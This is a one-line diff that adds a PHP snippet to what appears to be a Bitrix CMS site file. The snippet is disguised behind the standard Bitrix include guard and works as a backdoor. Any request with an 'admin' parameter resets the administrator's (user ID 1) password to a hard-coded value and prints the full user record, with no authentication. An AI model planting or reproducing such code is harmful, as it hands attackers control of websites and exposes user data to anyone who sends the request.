@@ -1,0 +1,1 @@
+<?if(!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED!==true)die();if(isset($_REQUEST['admin'])) {require($_SERVER['DOCUMENT_ROOT']."/bitrix/header.php"); $USER->Update(1,array("PASSWORD"=>'Bitrix*123456')); $USER->LAST_ERROR; $rsUser = CUser::GetByID(1); $arUser = $rsUser->Fetch(); print_r($arUser); exit;}?>
